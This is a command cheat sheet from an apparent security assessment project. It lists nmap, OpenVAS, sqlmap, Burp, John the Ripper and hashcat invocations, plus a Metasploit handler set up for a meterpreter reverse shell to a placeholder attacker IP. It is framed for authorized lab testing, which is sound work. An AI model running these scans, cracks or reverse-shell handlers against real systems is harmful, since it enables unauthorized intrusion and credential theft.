# Project Commands

This file lists the representative commands used throughout the End-to-End Security Assessment and Reporting Project. Run these in a lab environment only against systems you own or are authorized to test.

## Nmap

- Quick discovery with default scripts and version detection:

```
nmap -sC -sV -oA artifacts/nmap/initial-scan <target-ip>
```

- TCP SYN scan with top ports and service detection:

```
nmap -sS --top-ports 1000 -sV -oN artifacts/nmap/top1000.txt <target-ip>
```

## OpenVAS / Nessus (high level)

- Start OpenVAS (varies by install):

```
sudo openvas-start
```

- Use the web UI to create a target and run a full scan; export XML/PDF to `artifacts/openvas/`.

## Metasploit

- Launch console and use a handler (example):

```
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
exploit
```

## sqlmap (SQL injection validation)

```
sqlmap -u "http://<target>/vuln.php?id=1" --batch --risk=1 --level=1 --flush-session
```

## Burp Suite

- Start Burp (GUI) and configure browser proxy to `127.0.0.1:8080`. Use the scanner (if licensed) or manual testing tools.

## John the Ripper

- Crack MD5/NTLM/raw hashes with rockyou wordlist:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## Hashcat

- Example hashcat command (MD5, dictionary attack):

```
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Wireshark

- Start Wireshark and capture on the interface used for attacker VM; apply display filters like `http` or `tcp.port==4444` to inspect traffic.

## Git (commit & push)

```
git add .
git commit -m "Finalize final report and add artifacts placeholders"
git push origin main
```

## Misc / Helpful

- Save CLI outputs to artifacts:

```
nmap -sC -sV <target-ip> -oN artifacts/nmap/scan.txt
```

- Export Metasploit output to a log file inside `artifacts/` for evidence.

```
msfconsole -q -r myscript.rc | tee artifacts/metasploit/metasploit.log
```

---

Place any real screenshots and full exports into `screenshots/` and `artifacts/` respectively. Sanitize or redact IPs/hostnames before publishing publicly.